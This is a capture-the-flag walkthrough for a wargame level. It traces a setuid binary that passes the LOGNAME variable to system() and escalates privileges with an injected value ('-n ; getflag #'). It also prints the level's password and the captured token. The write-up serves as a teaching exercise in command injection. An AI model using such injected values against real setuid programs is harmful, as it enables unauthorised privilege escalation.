# LEVEL 07

> [!TIP]
> user: `level07` <br>
> pass: `wiok45aaoguiboiki2tuin6ub`

## STEP 01

1. A binary, **level07**, is provided to us, again with the suid bit set to
**flag07**

2. A little ltrace on **level07** show us that the binary take the **LOGNAME**
environment variable and make an argument of a **system** call to the `/bin/echo`
binary
	```bash
	ltrace ./level07
	#__libc_start_main(0x8048514, 1, 0xbffff6d4, 0x80485b0, 0x8048620 <unfinished ...>
	#getegid()                                                  = 2007
	#geteuid()                                                  = 2007
	#setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
	#setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
	#getenv("LOGNAME")                                          = "level07"
	#asprintf(0xbffff624, 0x8048688, 0xbfffff1e, 0xb7e5ee55, 0xb7fed280) = 18
	#system("/bin/echo level07 "level07
	# <unfinished ...>
	#--- SIGCHLD (Child exited) ---
	#<... system resumed> )                                     = 0
	#+++ exited (status 0) +++
	```

> [!NOTE]
> never trust an user inputable string like this ...

3. So making the following command let us execute the `getflag` command as
   **flag07**
   ```bash
   LOGNAME="-n ; getflag #" ./level07
   #Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
   ```

> [!IMPORTANT]
> the password for the next level is `fiumuikeil55xe9cu4dood66h`
